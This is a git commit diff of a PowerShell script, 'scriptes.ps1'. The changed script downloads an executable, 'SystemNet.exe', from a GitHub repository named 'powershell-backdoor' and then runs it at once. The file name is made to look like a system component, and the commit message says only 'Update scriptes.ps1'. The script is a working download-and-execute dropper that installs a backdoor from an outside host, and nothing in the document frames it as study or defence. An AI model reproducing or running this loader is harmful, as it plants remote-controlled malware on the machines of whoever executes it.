c5f5ecaa1dfc130181901f4df2e7c626a180c8e4
crypt0n-root <66523759+crypt0n-root@users.noreply.github.com>
2021-07-16 18:23:40 +0300

    Update scriptes.ps1

--- powershell/scriptes.ps1
+++ powershell/scriptes.ps1
@@ -1,5 +1,4 @@
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Tls,Tls11,Tls12'
 
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/crypt0n-root/systemdll/SystemNet.exe' -OutFile SystemNet.exe
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/crypt0n-root/powershell-backdoor/systemdll/SystemNet.exe' -OutFile SystemNet.exe
 
 .\SystemNet.exe
